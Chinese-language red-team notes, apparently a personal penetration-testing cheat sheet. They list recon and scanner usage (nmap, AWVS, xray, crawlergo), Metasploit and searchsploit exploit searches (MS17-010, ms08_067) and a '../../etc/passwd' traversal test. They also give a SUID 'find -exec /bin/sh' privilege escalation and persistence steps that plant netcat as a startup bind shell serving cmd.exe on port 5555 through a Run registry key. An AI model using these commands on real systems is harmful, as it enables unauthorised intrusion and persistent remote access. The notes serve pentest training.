https://github.com/Threekiii/Awesome-Redteam
https://github.com/CnHack3r/Penetration_PoC

Web漏洞分析
* 我们要挖掘什么漏洞?
* 应该从哪里挖掘?
* 网站源码分析
* 路径穿越 见 ## nginx 路径穿越
* https://github.com/swisskyrepo/PayloadsAllTheThings
* 已知源码
* 我们可以下载其源码本地分析
* 百度该源码漏洞
* 未知源码
* 黑盒测试该网站漏洞(手工、工具自动扫描)

## 渗透流程
1. awd/index.md 红队
1. 信息收集 > fscan/cscan/kscan(免杀), NMAP > AWVS > Appscan > Burpsuite > x-ray
* 445 - 永恒之蓝, 有账户后 psexec 执行命令
* 2375端口: docker 未授权
* 21/2121:  ftp 匿名登录/未授权
* 6379:     redis/未授权
* msf > searchsploit thinkphp
```shell
  msf > searchsploit thinkphp
  cd /usr/share/exploitdb/exploits/php/webapps
  cat 46150.txt
```
* cs上线
  * logonpasswords
  * 收集域信息
2. msfconsole
```shell
migrate
search ms10_018 #(xp的)
ms08_067 # (445端口, 2008以外系统, KB958644)
-- ms17_010: 用 AutoBlue-MS17-010见90_tools
search ms17_010 # (永恒之蓝)
```
3. Web:  kali - web程序 -  ZAP 扫描
```
1. vulmap:  python vulmap.py -u http://192.168.50.8:2003/
2. web 目录遍历 `downfile.jsp?filename=fan.pdf` 测试 `../../../../etc/passwd`
```
4. [linux suid find 提权](https://mp.weixin.qq.com/s/8rgvLbOmmjcxVZT7BoW5Og)
```shell
find / -perm -4000 # 如果有find 执行下面
find ./ aaa -exec '/bin/sh' \;
```
5.横向移动/域
msf: 1. autoroute 2.add socks proxy 3.域控 4.psexec (需开启admin$共享和ipc$及445,知道密码或hash)
cs: smb上线其他域

## MSF
nmap 探测漏洞

searchsploit
."searchsploit"是一个用于Exploit-DB的命令行搜索工具,它还允许你随身带一份
Exploit-DB的副本.
* SearchSploit为您提供了在本地保存的存储库中执行详细的离线搜索的能力.这种能力特
别适用于在没有互联网接入的情况下对网络进行安全评估.许多漏洞都包含了二进制文件
的链接,这些文件不包含在标准存储库中,但可以在我们的Exploit-DB二进制文件中找到
* 如果您预计您将在一个没有Internet的网络环境进行渗透测试,请确保您检查了两个存储库
以获得最完整的数据集.注意,这个工具的名称是"SearchSploit",顾名思义,它将搜
索所有的漏洞和shellcode.它不会包含任何文件和谷歌黑客数据库的结果
* 终端输入searchsploit启动(已经默认在Kali/Parrot中安装)

https://www.exploit-db.com/

```shell
searchsploit
searchsploit -m xxxx/xxx.py  # 复制到当前目录
searchsploit -t linux remote # 标题包含Linux Remote
searchsploit apache
```

基本搜索
* 基本搜索会同时匹配标题和路径中的内容
* 如:searchsploit smb windows remote
* 标题搜索
* 标题搜索只匹配标题,不会对路径中的关键词进行匹配
* 如:searchsploit-t smb windows remote
* 删除不想要的结果
* 使用--exclude＝选项删除不想要的结果
* 如:searchsploit smb windows remote--exclude＝＂(POC)Jtxt＂

## AWVS
Acunetix Web Vulnerability Scanner(简称AWVS)是一款知名
的网络漏洞扫描工具,它通过网络爬虫测试你的网站安全,检测流
行安全漏洞.
Acunetix推出了一个具有漏洞的测试网站
http://test.vulnweb.com/.

AWVS常见功能
* 网站爬行
* 漏洞扫描
* 目标发现
* 子域名扫描
* http 编辑
* http嗅探
* http模糊测试
* 认证测试
* 网络服务扫描器

linux 版本安装后。访问时用https://xxx:3443/

[AWVS13批量添加目标脚本](https://blog.csdn.net/weixin_45382656/article/details/118565077)

## xray
https://github.com/chaitin/xray

awvs+xray https://www.cnblogs.com/zzjdbk/p/13195955.html

```
xray webscan --basic-crawler http://example.com --html-output vuln.html
xray webscan --listen 0.0.0.0:7001 --html-output awvs.html
xray webscan --listen 127.0.0.1:7777 --html-output proxy.html
```
### crawergo联动
https://www.freebuf.com/sectool/252790.html

```sh
crawlergo -c YourChromiumPath -t 标签页数 Url
./xray webscan --listen 127.0.0.1:7777 --html-output vulnerability.html
./crawlergo -c chrome-mac/Chromium.app/Contents/MacOS/Chromium -t 10--request-proxy http://127.0.0.1:7777 http://testphp.vulnweb.com/
```

> 如果想半⾃动化⼀点，比如测试多个url可以参考：https://github.com/timwhitez/crawlergo_x_XRAY

与 w13scan 联动：
```sh
python3 w13scan.py -s 127.0.0.1 --html   # 会监听7778
/crawlergo -c chrome-mac/Chromium.app/Contents/MacOS/Chromium -t 10 --request-proxy http://127.0.0.1:7778 http://testphp.vulnweb.com/
```

## 存在目录时，返回403响应码

# 进行权限维持
开机自启动
每次启动登录时都会按顺序自动执行.
```bash
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
```
- 上传nc

upload nc.exe C:\\windows\\system32

- 查看自启动注册表项I

reg enumkey-k HKLM\\software\\microsoft\\windows\\currentversion\\un

- 添加注册表,开机启动nc并开启监听

reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc-d 'C:\\windows\\system32\\nc64.exe-Ldp 5555-e cmd.exe'

- 查看注册表指定项值

reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc

- 计划任务

`schtasks /create /sc MINUTE /mo 1 /tr C:\Users\Administrator\Desktop\mx\5555.exe /tn test`


# 系统审记
## nginx 路径穿越
```
location /xxx {
  alias /abc/;
}
```
修复

```
location /xxx/ {
  alias /abc/;
}
```